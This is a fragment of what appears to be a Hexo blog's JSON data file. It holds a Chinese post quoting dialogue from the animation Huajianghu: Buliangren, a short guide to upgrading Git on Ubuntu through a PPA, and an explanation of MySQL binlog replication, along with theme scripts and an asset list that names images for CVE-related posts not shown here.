DPlayer({\"container\":document.getElementById(\"dplayer0\"),\"loop\":false,\"screenshot\":true,\"preload\":\"auto\",\"volume\":0.4,\"video\":{\"url\":\"https://dpv.videocc.net/a2ad892af4/8/a2ad892af4a82f0ad4f5062526946108_1.mp4?pid=1694175956521X1590085\"},\"danmaku\":{\"id\":\"46190A32F63DFF2CF0A3BB0F3293636C\",\"api\":\"https://api.prprpr.me/dplayer/\",\"addition\":[\"https://api.prprpr.me/dplayer/v3/bilibili?aid=17150441\"]}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"袁天罡对话幼时假李星云\"><a href=\"#袁天罡对话幼时假李星云\" class=\"headerlink\" title=\"袁天罡对话幼时假李星云\"></a>袁天罡对话幼时假李星云</h3><p>从今日起，你要将他当做镜中的自己。不仅是武功，任何事情，你都要学他所学，仿他所示。</p>\n<p>为什么？</p>\n<p>因为，你们都是李星云，但也可以都不是。从现在起，谁能复唐，谁便是李唐后裔，谁，便是本帅眼中的天子。</p>","more":"<h3 id=\"袁天罡龙泉城下对话李星云\"><a href=\"#袁天罡龙泉城下对话李星云\" class=\"headerlink\" title=\"袁天罡龙泉城下对话李星云\"></a>袁天罡龙泉城下对话李星云</h3><p>他们便是当年建造此处的不良人？</p>\n<p>枯骨罢了，何足挂齿。</p>\n<p>这就是一将功成，万骨皆枯……</p>\n<p>将？岂可与帝王功业相比？帝王谈笑间，当一言倾天下。</p>\n<p>笑谈之间，数不尽的丰功伟绩。但笑谈之中，也是数不尽的白骨皑皑。一句话，会有多少人颠沛流离，又会有多少人魂归无处。只是因为，一个人的，一句话？但这一句话能杀人，是不是也能救人呢？其实我始终明白，龙泉不出，这些可敬的死士便会永不瞑目；大唐不复，他们的牺牲就会毫无价值。我辈身在江湖，亦逢乱世，当勇往直前无所无惧。但我也明白，这世间无不死之人，更无不衰之国。可若是辈出的能人都像你一般，一活百年，抓着已逝之势，不顾已失民心，妄图星火燎原。这天下，会变成什么样子呢？道法自然这四个字，我想世间没有人会比你更清楚它的含义。不是吗？袁天罡，三百年了，再不收手，你就没机会了。</p>\n<p>唉……你长大了，终不似当年模样。李星云，可否陪本帅，聊聊。</p>\n<h3 id=\"天罡赋其一\"><a href=\"#天罡赋其一\" class=\"headerlink\" title=\"天罡赋其一\"></a>天罡赋其一</h3><p>天下尽做饵，唯本帅执杆。三百年光阴，京师长安到东都洛阳兴亡起伏，从鼓动杨广大兴师旅到造就贞观之治，渭水之盟到大败突厥、废王立武到二圣临朝，谋天宝之乱到纵黄巢造反警示僖宗。<br>臣，无不是为大唐，这其中多少苦心，多少苦难，本帅始终不曾停下脚步，却因为你，踌躇了数十年。</p>\n<p>三百年，你的每一次成功和失败，都让你很享受吧。</p>\n<h3 id=\"沉醉不知归路，佳酿不知甘苦\"><a href=\"#沉醉不知归路，佳酿不知甘苦\" class=\"headerlink\" title=\"沉醉不知归路，佳酿不知甘苦\"></a>沉醉不知归路，佳酿不知甘苦</h3><p>三百年来，除挚友李淳风，本帅不屑与任何人饮酒，但今日的你，勉强有资格与本帅平坐。本帅以此尘封三十年的佳酿，敬年轻的殿下。 如何？</p>\n<p>尚可。</p>\n<p>可惜本帅永不能知道这其中滋味了。</p>\n<p>不知也罢，苦。</p>\n<p>哈哈哈哈。哪怕是苦也好啊。</p>\n<h3 id=\"把酒话桑麻\"><a href=\"#把酒话桑麻\" class=\"headerlink\" title=\"把酒话桑麻\"></a>把酒话桑麻</h3><p>三百年来，此世间，唯本帅一人知你，本帅也唯知你一人。你身在本帅所布之局，一路走来，虽已深谙事理洞悉时局，但你最终仍不会称帝。对吗？但你心知不遂本帅心愿，本帅定不罢休。且你清楚，就算集众人之力，也无法除掉本帅，所以单独与我进入地宫，是想等待一个变数。让本帅永远留下，对吗？而今你又多了一个原因，便是为你那死去的无名兄长，报仇。</p>\n<p>你还真是，很了解我呢！</p>\n<p>数十年，本帅眼中只有你一人，怎能不了解？</p>\n<h3 id=\"天罡赋其二\"><a href=\"#天罡赋其二\" class=\"headerlink\" title=\"天罡赋其二\"></a>天罡赋其二</h3><p>数十年艰辛，本帅为的并不是殿下能称帝。皇帝之名，只是个幌子罢了。乱世数十载，以至当下之势。一直以来，本帅才是那个执棋者，本帅才是那个造局人。但今日，本帅死，殿下就会知道，什么才叫真正的，天！下！大！乱！</p>\n<p>这世间，最不缺的便是狼子野心者。前有朱贼父子篡权，中有沙陀李鸦儿，岐地宋文通野心博大，现有门外诸侯权贵，暗流汹涌，尤其那李嗣源，更甚。</p>\n<p>对本帅的恐惧，是世人心中最后的枷锁。而你，便是那个开锁之人。此锁一开，天下便再无忌惮。那时，才是真正的尸山血海。而那些本不该死的人，可都是因为你而死啊。</p>\n<p>殿下，这盘棋，臣已为您开局，现在该换你来执了。四夷宾服，万邦来朝。可惜本帅，等不到您登基那天，今日就当提前行礼。</p>\n<p>高祖，太宗，高宗，玄宗，代，德，顺，武，宣，懿，僖，昭，诸君。</p>\n<p>臣！尽力了！</p>\n<h3 id=\"恭送大帅\"><a href=\"#恭送大帅\" class=\"headerlink\" title=\"恭送大帅\"></a>恭送大帅</h3><div id=\"dplayer0\" class=\"dplayer hexo-tag-dplayer-mark\" style=\"margin-bottom: 20px;\"></div><script>(function(){var player = new DPlayer({\"container\":document.getElementById(\"dplayer0\"),\"loop\":false,\"screenshot\":true,\"preload\":\"auto\",\"volume\":0.4,\"video\":{\"url\":\"https://dpv.videocc.net/a2ad892af4/8/a2ad892af4a82f0ad4f5062526946108_1.mp4?pid=1694175956521X1590085\"},\"danmaku\":{\"id\":\"46190A32F63DFF2CF0A3BB0F3293636C\",\"api\":\"https://api.prprpr.me/dplayer/\",\"addition\":[\"https://api.prprpr.me/dplayer/v3/bilibili?aid=17150441\"]}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script>"},{"title":"Ubuntu 升级Git版本","date":"2023-03-26T14:53:00.000Z","_content":"\nUbuntu自己带的git的版本可以正常使用，但是出于对完美的追求，还是想将Git升级为相对高一点的版本。\n\n只需要依次执行以下代码就OK了。\n\n```bash\nsudo add-apt-repository ppa:git-core/ppa\nsudo apt-get update\nsudo apt-get install git\n```\n\n执行完事后，可以通过以下命令查看Git的版本。\n\n```bash\ngit --veision\n```\n\n<!-- more -->\n\n>节选自SCDN诸葛_瓜皮的文章\n>https://blog.csdn.net/Ezreal_King/article/details/79999131\n>记录本文章纯粹是为了之后自己方便寻找","source":"_posts/ubuntu-update-git.md","raw":"---\ntitle: Ubuntu 升级Git版本\ndate: 2023-03-26 22:53:00\ncategories: \n  - 探索\ntags:\n  - Git\n  - Ubuntu\n---\n\nUbuntu自己带的git的版本可以正常使用，但是出于对完美的追求，还是想将Git升级为相对高一点的版本。\n\n只需要依次执行以下代码就OK了。\n\n```bash\nsudo add-apt-repository ppa:git-core/ppa\nsudo apt-get update\nsudo apt-get install git\n```\n\n执行完事后，可以通过以下命令查看Git的版本。\n\n```bash\ngit --veision\n```\n\n<!-- more -->\n\n>节选自SCDN诸葛_瓜皮的文章\n>https://blog.csdn.net/Ezreal_King/article/details/79999131\n>记录本文章纯粹是为了之后自己方便寻找","slug":"ubuntu-update-git","published":1,"updated":"2024-05-03T03:55:54.885Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5gk008c7zj37peddv3i","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>Ubuntu自己带的git的版本可以正常使用，但是出于对完美的追求，还是想将Git升级为相对高一点的版本。</p>\n<p>只需要依次执行以下代码就OK了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo add-apt-repository ppa:git-core/ppa</span><br><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install git</span><br></pre></td></tr></table></figure>\n\n<p>执行完事后，可以通过以下命令查看Git的版本。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git --veision</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<blockquote>\n<p>节选自SCDN诸葛_瓜皮的文章<br><a href=\"https://blog.csdn.net/Ezreal_King/article/details/79999131\">https://blog.csdn.net/Ezreal_King/article/details/79999131</a><br>记录本文章纯粹是为了之后自己方便寻找</p>\n</blockquote>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>Ubuntu自己带的git的版本可以正常使用，但是出于对完美的追求，还是想将Git升级为相对高一点的版本。</p>\n<p>只需要依次执行以下代码就OK了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo add-apt-repository ppa:git-core/ppa</span><br><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install git</span><br></pre></td></tr></table></figure>\n\n<p>执行完事后，可以通过以下命令查看Git的版本。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git --veision</span><br></pre></td></tr></table></figure>","more":"<blockquote>\n<p>节选自SCDN诸葛_瓜皮的文章<br><a href=\"https://blog.csdn.net/Ezreal_King/article/details/79999131\">https://blog.csdn.net/Ezreal_King/article/details/79999131</a><br>记录本文章纯粹是为了之后自己方便寻找</p>\n</blockquote>"},{"title":"二进制日志与数据库复制的关系","date":"2023-07-13T02:47:40.000Z","_content":"\n### 数据库复制的原理解读\n\n最近进行的大三的小学期答辩属实是让我重新审视了自己，有些操作自己是会配置了，也可以达到自己的需求了，但是对于技术的底层逻辑和原理并不清楚，为了避免自己成为一个机械的打字员，有必要将一些技术的底层实现原理进行一些剖析。\n\n这是网上找的数据库主从复制的原理图。接下来结合这张图来进行对数据库主从复制的原理讲解。\n\n<!-- more -->\n\n![数据库主从复制的](./why-mysql-binlog/1.png)\n\n1. master首先记录二进制日志，将master主机上所有发生的操作（增删改）都记录到二进制日志中去。\n\n2. slave会开启一个I/O进程，用来和master建立连接，进行binlog dump process。这个进程会从二进制日志中读取事件，如果二者是同步的，那么slave会进入休眠状态，等master产生新的事件，slave会通过I/O连接将新事件写进自己的中继日志里去。\n\n3. SQL thread是复制的最后一步。SQL线程会从slave的中继日志中读取事件，并在本机中进行重放，直至与master的数据保持一致。\n\n4. 通过课外资料的查询，还发现一个很有意思的点：复制过程有一个很重要的限制-->复制在slave上是串行化的，也就是说master上的并行更新操作不能在slave上并行操作。\n\n### 额外的话\n\n在平常项目中，老师验证你的数据库主从复制或者双主的依据就是观察数据库`show slave status \\G`的`Slave_IO_Running`和`Slave_SQL_Running`两个“yes”。通过这个文章结合这张图片，突然就可以顿悟为什么这两个参数变为“yes”就代表数据库的复制功能是实现的了。","source":"_posts/why-mysql-binlog.md","raw":"---\ntitle: 二进制日志与数据库复制的关系\ndate: 2023-07-13 10:47:40\ncategories: 理论知识\ntags:\n  - Linux \n  - MySQL\n---\n\n### 数据库复制的原理解读\n\n最近进行的大三的小学期答辩属实是让我重新审视了自己，有些操作自己是会配置了，也可以达到自己的需求了，但是对于技术的底层逻辑和原理并不清楚，为了避免自己成为一个机械的打字员，有必要将一些技术的底层实现原理进行一些剖析。\n\n这是网上找的数据库主从复制的原理图。接下来结合这张图来进行对数据库主从复制的原理讲解。\n\n<!-- more -->\n\n![数据库主从复制的](./why-mysql-binlog/1.png)\n\n1. master首先记录二进制日志，将master主机上所有发生的操作（增删改）都记录到二进制日志中去。\n\n2. slave会开启一个I/O进程，用来和master建立连接，进行binlog dump process。这个进程会从二进制日志中读取事件，如果二者是同步的，那么slave会进入休眠状态，等master产生新的事件，slave会通过I/O连接将新事件写进自己的中继日志里去。\n\n3. SQL thread是复制的最后一步。SQL线程会从slave的中继日志中读取事件，并在本机中进行重放，直至与master的数据保持一致。\n\n4. 通过课外资料的查询，还发现一个很有意思的点：复制过程有一个很重要的限制-->复制在slave上是串行化的，也就是说master上的并行更新操作不能在slave上并行操作。\n\n### 额外的话\n\n在平常项目中，老师验证你的数据库主从复制或者双主的依据就是观察数据库`show slave status \\G`的`Slave_IO_Running`和`Slave_SQL_Running`两个“yes”。通过这个文章结合这张图片，突然就可以顿悟为什么这两个参数变为“yes”就代表数据库的复制功能是实现的了。","slug":"why-mysql-binlog","published":1,"updated":"2024-05-03T03:55:54.885Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5gl008g7zj3cvpg97ch","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"数据库复制的原理解读\"><a href=\"#数据库复制的原理解读\" class=\"headerlink\" title=\"数据库复制的原理解读\"></a>数据库复制的原理解读</h3><p>最近进行的大三的小学期答辩属实是让我重新审视了自己，有些操作自己是会配置了，也可以达到自己的需求了，但是对于技术的底层逻辑和原理并不清楚，为了避免自己成为一个机械的打字员，有必要将一些技术的底层实现原理进行一些剖析。</p>\n<p>这是网上找的数据库主从复制的原理图。接下来结合这张图来进行对数据库主从复制的原理讲解。</p>\n<span id=\"more\"></span>\n\n<p><img src=\"/2023/07/13/why-mysql-binlog/1.png\" alt=\"数据库主从复制的\"></p>\n<ol>\n<li><p>master首先记录二进制日志，将master主机上所有发生的操作（增删改）都记录到二进制日志中去。</p>\n</li>\n<li><p>slave会开启一个I&#x2F;O进程，用来和master建立连接，进行binlog dump process。这个进程会从二进制日志中读取事件，如果二者是同步的，那么slave会进入休眠状态，等master产生新的事件，slave会通过I&#x2F;O连接将新事件写进自己的中继日志里去。</p>\n</li>\n<li><p>SQL thread是复制的最后一步。SQL线程会从slave的中继日志中读取事件，并在本机中进行重放，直至与master的数据保持一致。</p>\n</li>\n<li><p>通过课外资料的查询，还发现一个很有意思的点：复制过程有一个很重要的限制–&gt;复制在slave上是串行化的，也就是说master上的并行更新操作不能在slave上并行操作。</p>\n</li>\n</ol>\n<h3 id=\"额外的话\"><a href=\"#额外的话\" class=\"headerlink\" title=\"额外的话\"></a>额外的话</h3><p>在平常项目中，老师验证你的数据库主从复制或者双主的依据就是观察数据库<code>show slave status \\G</code>的<code>Slave_IO_Running</code>和<code>Slave_SQL_Running</code>两个“yes”。通过这个文章结合这张图片，突然就可以顿悟为什么这两个参数变为“yes”就代表数据库的复制功能是实现的了。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"数据库复制的原理解读\"><a href=\"#数据库复制的原理解读\" class=\"headerlink\" title=\"数据库复制的原理解读\"></a>数据库复制的原理解读</h3><p>最近进行的大三的小学期答辩属实是让我重新审视了自己，有些操作自己是会配置了，也可以达到自己的需求了，但是对于技术的底层逻辑和原理并不清楚，为了避免自己成为一个机械的打字员，有必要将一些技术的底层实现原理进行一些剖析。</p>\n<p>这是网上找的数据库主从复制的原理图。接下来结合这张图来进行对数据库主从复制的原理讲解。</p>","more":"<p><img src=\"/2023/07/13/why-mysql-binlog/1.png\" alt=\"数据库主从复制的\"></p>\n<ol>\n<li><p>master首先记录二进制日志，将master主机上所有发生的操作（增删改）都记录到二进制日志中去。</p>\n</li>\n<li><p>slave会开启一个I&#x2F;O进程，用来和master建立连接，进行binlog dump process。这个进程会从二进制日志中读取事件，如果二者是同步的，那么slave会进入休眠状态，等master产生新的事件，slave会通过I&#x2F;O连接将新事件写进自己的中继日志里去。</p>\n</li>\n<li><p>SQL thread是复制的最后一步。SQL线程会从slave的中继日志中读取事件，并在本机中进行重放，直至与master的数据保持一致。</p>\n</li>\n<li><p>通过课外资料的查询，还发现一个很有意思的点：复制过程有一个很重要的限制–&gt;复制在slave上是串行化的，也就是说master上的并行更新操作不能在slave上并行操作。</p>\n</li>\n</ol>\n<h3 id=\"额外的话\"><a href=\"#额外的话\" class=\"headerlink\" title=\"额外的话\"></a>额外的话</h3><p>在平常项目中，老师验证你的数据库主从复制或者双主的依据就是观察数据库<code>show slave status \\G</code>的<code>Slave_IO_Running</code>和<code>Slave_SQL_Running</code>两个“yes”。通过这个文章结合这张图片，突然就可以顿悟为什么这两个参数变为“yes”就代表数据库的复制功能是实现的了。</p>"}],"PostAsset":[{"_id":"source/_posts/CVE-2019-0708/1.png","slug":"1.png","post":"clvq6s5cv000a7zj32gg32qjp","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2019-0708/2.png","slug":"2.png","post":"clvq6s5cv000a7zj32gg32qjp","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2019-0708/3.png","slug":"3.png","post":"clvq6s5cv000a7zj32gg32qjp","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2019-0708/4.png","slug":"4.png","post":"clvq6s5cv000a7zj32gg32qjp","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2019-0708/5.png","slug":"5.png","post":"clvq6s5cv000a7zj32gg32qjp","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2019-0708/6.png","slug":"6.png","post":"clvq6s5cv000a7zj32gg32qjp","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2019-0708/7.png","slug":"7.png","post":"clvq6s5cv000a7zj32gg32qjp","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2019-0708/8.png","slug":"8.png","post":"clvq6s5cv000a7zj32gg32qjp","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2020-0796/1.png","slug":"1.png","post":"clvq6s5cz000d7zj3cnr04hc6","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2020-0796/10.png","slug":"10.png","post":"clvq6s5cz000d7zj3cnr04hc6","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2020-0796/11.png","slug":"11.png","post":"clvq6s5cz000d7zj3cnr04hc6","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2020-0796/12.png","slug":"12.png","post":"clvq6s5cz000d7zj3cnr04hc6","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2020-0796/13.png","slug":"13.png","post":"clvq6s5cz000d7zj3cnr04hc6","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2020-0796/2.png","slug":"2.png","post":"clvq6s5cz000d7zj3cnr04hc6","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2020-0796/3.png","slug":"3.png","post":"clvq6s5cz000d7zj3cnr04hc6","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2020-0796/4.png","slug":"4.png","post":"clvq6s5cz000d7zj3cnr04hc6","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2020-0796/5.png","slug":"5.png","post":"clvq6s5cz000d7zj3cnr04hc6","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2020-0796/6.png","slug":"6.png","post":"clvq6s5cz000d7zj3cnr04hc6","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2020-0796/7.png","slug":"7.png","post":"clvq6s5cz000d7zj3cnr04hc6","modified":0,"renderable":0},{"_id":"source/_posts/CVE-2020-0796/8.png","slug":"8.png